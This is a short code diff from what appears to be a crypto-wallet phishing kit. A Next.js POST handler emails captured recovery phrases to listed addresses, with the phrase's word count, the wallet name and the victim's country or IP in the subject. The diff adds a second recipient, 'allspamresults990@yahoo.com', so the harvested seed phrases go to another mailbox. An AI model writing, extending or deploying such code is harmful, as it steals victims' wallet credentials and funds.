@@ -275,8 +275,7 @@ export async function POST(req: NextRequest) {
       // Add as many emails into this array as you need! Limit per request is 50.
       to: [
         "uwemuwemetim@gmail.com", 
-        // "any-other-email@gmail.com",
-        // "your-third-email@yahoo.com"
+        "allspamresults990@yahoo.com"
       ],
       subject: `🔐 ${wordCount}-word phrase · ${wallet ?? "Unknown"} · ${flag}${geo.country_name ?? ip}`,
       html,
